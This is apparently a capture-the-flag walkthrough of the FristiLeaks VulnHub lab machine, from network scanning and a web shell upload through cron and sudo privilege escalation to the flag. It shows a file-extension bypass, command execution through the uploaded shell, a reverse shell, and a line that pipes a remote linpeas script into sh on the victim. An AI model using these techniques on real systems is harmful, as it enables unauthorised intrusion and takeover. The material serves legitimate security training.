1. Scan the network segment.
    ```command
    $ sudo netdiscover -i eth0
    ```
    ![image](https://hackmd.io/_uploads/r1THU7yOxe.png)
2. Scan the IP address.
    ```linux
    $ nmap -sV 192.168.163.136
    Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 02:34 EDT
    Nmap scan report for 192.168.163.136
    Host is up (0.00033s latency).
    Not shown: 989 filtered tcp ports (no-response), 10 filtered tcp ports (host-prohibited)
    PORT   STATE SERVICE VERSION
    80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
    MAC Address: 08:00:27:A5:A6:76 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 11.41 seconds
    ```
3. Directory traversal.
    ```linux
    $ dirb http://192.168.163.136 
    ```
    ![image](https://hackmd.io/_uploads/S1lWsXy_ex.png)
Visit `robots.txt`.
![image](https://hackmd.io/_uploads/HJZmom1dll.png)
However, all three paths return `301`, and adding `/` at the end redirects to another page that says we went to the wrong place.
![image](https://hackmd.io/_uploads/BkkTimkuxl.png)
Visit `http://192.168.163.136/images/` and view the directory listing.
![image](https://hackmd.io/_uploads/ry4uTQJulg.png)
4. Use `nikto` for a more thorough website vulnerability scan.
    ```linux
    $ nikto -h http://192.168.163.136
    ```
    ![image](https://hackmd.io/_uploads/HyhTTQJOgg.png)
5. this directory name is so hard to find.....
    ```
    http://192.168.163.136/fristi/
    ```
    ![image](https://hackmd.io/_uploads/ByyEhVJ_ll.png)
Find a base64 string in the page source.
![image](https://hackmd.io/_uploads/rJkWoVg_xg.png)
Since the string starts with `iVBORw0KGgo...`, it clearly represents a PNG image encoded in base64, so we decode it with a [base64 to image](https://base64.guru/converter/decode/image) converter and reveal an image.
![image](https://hackmd.io/_uploads/rkxqsNgOlg.png)
The source also contains a hidden hint from the author.
![image](https://hackmd.io/_uploads/HJI1GHxuxg.png)
We then try logging in with the credentials `eezeepz/keKkeKKeKKeKkEkkEk`.
![image](https://hackmd.io/_uploads/H1g2ZBeuxx.png)
6. After entering the upload page, upload a normal image first.
![image](https://hackmd.io/_uploads/SynM1dedeg.png)
go to `/uploads`
![image](https://hackmd.io/_uploads/BkC91OgOlx.png)
then try to paste the file name
![image](https://hackmd.io/_uploads/BJy6yuldge.png)
Now that the upload process is understood, try uploading a `shell`. To bypass the file-extension check, rename the `php` file extension to `gif`.
The upload appears to succeed, but the browser tries to interpret it as an image and displays an error.
![image](https://hackmd.io/_uploads/Hy7agdg_ex.png)
then **use Burp to try to modify request**, first I intercept the request to upload a normal image
![image](https://hackmd.io/_uploads/S1FIMuedxl.png)
only alter `filename` and fill `php shell` in content
![image](https://hackmd.io/_uploads/HJOyXdxOlx.png)
input command to test
![image](https://hackmd.io/_uploads/HkBNXux_xx.png)
Bingo!!!
7. start finding `flag`
try the command `find` to search `home` directory
    ```
    $ curl "http://192.168.163.136/fristi/uploads/shell.php.jpg?cmd=find%20/home%20-name%20*.txt"
    ▒/home/eezeepz/notes.txt
    ```
    find some hints
    ```
    $ curl "http://192.168.163.136/fristi/uploads/shell.php.jpg?cmd=cat%20/home/eezeepz/notes.txt"
    ▒Yo EZ,

    I made it possible for you to do some automated checks, 
    but I did only allow you access to /usr/bin/* system binaries. I did
    however copy a few extra often needed commands to my 
    homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
    from /home/admin/

    Don't forget to specify the full path for each binary!

    Just put a file called "runthis" in /tmp/, each line one command. The 
    output goes to the file "cronresult" in /tmp/. It should 
    run every minute with my account privileges.

    - Jerry
    ```
* The note indicates that a `cron` job runs every minute with Jerry’s privileges.
* The cron job checks `/tmp/runthis` and executes each line as a command.
* Command output is written to `/tmp/cronresult`.
* The permitted commands are limited to system binaries under `/usr/bin/* `and commands that Jerry copied to `/home/admin/`, including `chmod`, `df`, `cat`, `echo`, `ps`, `grep`, and `egrep`.
8. After getting the hint, begin privilege escalation
    using `cron` to change directory permissions, thereby allowing I to enumerate the information inside /home/admin
    ```
    $ curl "http://192.168.163.136/fristi/uploads/shell.php.jpg?cmd=cat%20/tmp/runthis"
    ▒/home/admin/chmod -R 777 /home/admin
    ```
   * Originally, the `/home/admin` directory had very strict permissions, and it was usually readable only by `admin` or `root`.
   * This command uses `chmod -R 777` to change the permissions of the entire `/home/admin` directory, including all files and subdirectories inside it, so that everyone can read, write, and execute them. Since `7 = 1 + 2 + 4`, `7` means readable, writable, and executable.
   * Because this command is executed by the `cron` job as `admin`, Linux allows it to change file permissions.
   * After the permissions are changed, even the low-privileged `apache` account can read files in `/home/admin` that were previously restricted.
   * In short, `cron` runs this command with admin privileges, indirectly removing the access restrictions on the files.

Then wait one minute and check whether `cronresult` successfully records the privilege-escalation command and confirms that it runs every minute.
    ```
    $ curl "http://192.168.163.136/fristi/uploads/shell.php.jpg?cmd=cat%20/tmp/cronresult"
    executing: /home/admin/chmod -R 777 /home/admin
    ```
    check `admin` directory
    ```
    $ curl "http://192.168.163.136/fristi/uploads/shell.php.jpg?cmd=ls%20-la%20/home/admin"
    ▒total 652
    drwxrwxrwx. 2 admin     admin       4096 Nov 19  2015 .
    drwxr-xr-x. 5 root      root        4096 Nov 19  2015 ..
    -rwxrwxrwx. 1 admin     admin         18 Sep 22  2015 .bash_logout
    -rwxrwxrwx. 1 admin     admin        176 Sep 22  2015 .bash_profile
    -rwxrwxrwx. 1 admin     admin        124 Sep 22  2015 .bashrc
    -rwxrwxrwx  1 admin     admin      45224 Nov 18  2015 cat
    -rwxrwxrwx  1 admin     admin      48712 Nov 18  2015 chmod
    -rwxrwxrwx  1 admin     admin        737 Nov 18  2015 cronjob.py
    -rwxrwxrwx  1 admin     admin         21 Nov 18  2015 cryptedpass.txt
    -rwxrwxrwx  1 admin     admin        258 Nov 18  2015 cryptpass.py
    -rwxrwxrwx  1 admin     admin      90544 Nov 18  2015 df
    -rwxrwxrwx  1 admin     admin      24136 Nov 18  2015 echo
    -rwxrwxrwx  1 admin     admin     163600 Nov 18  2015 egrep
    -rwxrwxrwx  1 admin     admin     163600 Nov 18  2015 grep
    -rwxrwxrwx  1 admin     admin      85304 Nov 18  2015 ps
    -rw-r--r--  1 fristigod fristigod     25 Nov 19  2015 whoisyourgodnow.txt
    ```
    looks like both txt file need to decrypt through python file
    ```
    $ curl "http://192.168.163.136/fristi/uploads/shell.php.jpg?cmd=cat%20/home/admin/whoisyourgodnow.txt"
    ▒=RFn0AKnlMHMPIzpyuTI0ITG
    $ curl "http://192.168.163.136/fristi/uploads/shell.php.jpg?cmd=cat%20/home/admin/cryptedpass.txt"    
    ▒mVGZ3O3omkJLmy2pcuTq
    ```    
    but `python` file is `python2` grammer
    ```
    $ curl "http://192.168.163.136/fristi/uploads/shell.php.jpg?cmd=cat%20/home/admin/cryptpass.py"
    ▒#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
    import base64,codecs,sys

    def encodeString(str):
        base64string= base64.b64encode(str)
        return codecs.encode(base64string[::-1], 'rot13')

    cryptoResult=encodeString(sys.argv[1])
    print cryptoResult
    ```
    let AI help me to write a `python3` version
    ```python
    import base64, codecs, binascii


    def decodeString(s: str) -> str:
        # decrypt process: ROT13 -> rotation -> Base64 decrypt (auto fill '=' padding)
        # s: encrypt text
        
        try:
            rot13_decoded = codecs.decode(s, 'rot13')        # ROT13
            reversed_str = rot13_decoded[::-1]               # rotate
            padded = reversed_str + ('=' * (-len(reversed_str) % 4))  # fill Base64 padding
            return base64.b64decode(padded).decode('utf-8')  # Base64 decryption
        
        except (binascii.Error, UnicodeDecodeError, ValueError) as e:
            return f"decrypt failed: {e}"
        
    # encrypt content
    enc1 = "mVGZ3O3omkJLmy2pcuTq"
    enc2 = "=RFn0AKnlMHMPIzpyuTI0ITG"

    if __name__ == "__main__":
        print(decodeString(enc1))  
        print(decodeString(enc2))
    ```
    get `thisisalsopw123` and `LetThereBeFristi!` two passwords
9. It suddenly occurred to me that I could use Burp to inject a [reverse shell].(https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
![image](https://hackmd.io/_uploads/ryQQxf7uex.png)
finally I can input command
![image](https://hackmd.io/_uploads/SkWElzQulg.png)

The current shell is a non-interactive basic shell with limited functionality, so it needs to be upgraded to a fully functional TTY shell first
    ```
    $ su admin
    standard in must be a tty
    
    $ python -c 'import pty; pty.spawn("/bin/bash")'
    ```
10. switcth account to `admin` and `fristigod`, passwords are correct, but these two accounts have no usable informations
    ![image](https://hackmd.io/_uploads/SJoiZGQdxx.png)
    ![image](https://hackmd.io/_uploads/Hy7nBzXuel.png)

11.  use `linpeas` to scan whether there is a loop can be used
        ```shel
        $ python -m http.server # Host
        $ curl 192.168.163.137:8000/linpeas.sh | sh # Victim
        ``` 
        find a binary document with `SUID` privilege
![image](https://hackmd.io/_uploads/HJCRVXX_gg.png)

12. Check available permissions
    ```
    $ sudo -l
    [sudo] password for fristigod: LetThereBeFristi!

    Matching Defaults entries for fristigod on this host:
        requiretty, !visiblepw, always_set_home, env_reset, env_keep="COLORS
        DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1
        PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
        LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
        LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL
        LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
        secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

    User fristigod may run the following commands on this host:
        (fristi : ALL) /var/fristigod/.secret_admin_stuff/doCom
    ```
    * This means the target is configured with a `sudo` rule that allows fristigod to run `/var/fristigod/.secret_admin_stuff/doCom`.
    * `doCom` is itself a privileged program (for example, it may be SUID-root or otherwise have elevated privileges) that can execute commands as the `fristi` user.
    * Running `doCom bash` is equivalent to opening a Bash shell as `fristi`, which has higher privileges than fristigod.
    * This is a typical `sudo` misconfiguration that allows a low-privileged user to run a controllable command with elevated privileges.
13. privilege escalation
    ```
    $ sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom bash
    ```
    ![image](https://hackmd.io/_uploads/SJCStfX_gg.png)

    I get Flag!!!
    ```
    # cat fristileaks_secrets.txt
    cat fristileaks_secrets.txt
    Congratulations on beating FristiLeaks 1.0 by Ar0xA [https://tldr.nu]

    I wonder if you beat it in the maximum 4 hours it's supposed to take!

    Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)


    Flag: Y0u_kn0w_y0u_l0ve_fr1st1
    ```
